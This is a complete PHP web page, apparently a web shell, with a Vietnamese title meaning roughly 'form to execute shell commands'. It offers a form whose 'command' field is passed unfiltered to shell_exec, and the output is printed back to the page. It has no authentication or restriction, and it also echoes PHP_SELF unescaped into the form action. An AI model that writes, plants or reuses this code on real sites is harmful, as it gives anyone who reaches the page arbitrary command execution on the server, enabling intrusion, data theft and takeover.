<!DOCTYPE html>
<html>
<head>
    <title>Form th?c thi shell command</title>
</head>
<body>
    <form method="POST" action="<?php echo $_SERVER['PHP_SELF']; ?>">
        <label for="command">Enter Your Shell:</label>
        <input type="text" name="command" id="command">
        <input type="submit" value="Run">
    </form>

    <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $command = $_POST["command"];
        $output = shell_exec($command);
        echo "<pre>$output</pre>";
    }
    ?>
</body>
</html>
